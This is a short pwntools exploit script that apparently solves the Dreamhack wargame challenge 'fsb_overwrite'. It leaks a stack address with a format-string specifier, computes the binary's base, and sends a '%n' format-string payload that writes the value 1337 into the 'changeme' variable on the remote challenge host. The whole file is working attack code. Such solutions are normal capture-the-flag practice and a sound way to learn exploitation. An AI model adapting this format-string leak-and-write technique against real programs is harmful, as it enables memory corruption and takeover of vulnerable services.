from pwn import *

#p = process('./fsb_overwrite')
p = remote('host3.dreamhack.games', 8596)
e = ELF('./fsb_overwrite')
#gdb.attach(p, api=True)

rsp_0x48_offset = 0x1293
p.sendline(b'%15$p')
rsp_0x48_leak = int(p.recvline()[:-1],16)
base = rsp_0x48_leak - rsp_0x48_offset
changeme = base + e.sym['changeme']

log.info('rsp_0x48_leak: ' + hex(rsp_0x48_leak))
log.info('base: ' + hex(base))
log.info('changeme: ' + hex(changeme))

payload = b'%1337c%8$n'
payload = payload.ljust(0x10, b'A') 
payload += p64(changeme)
p.sendline(payload)

p.interactive()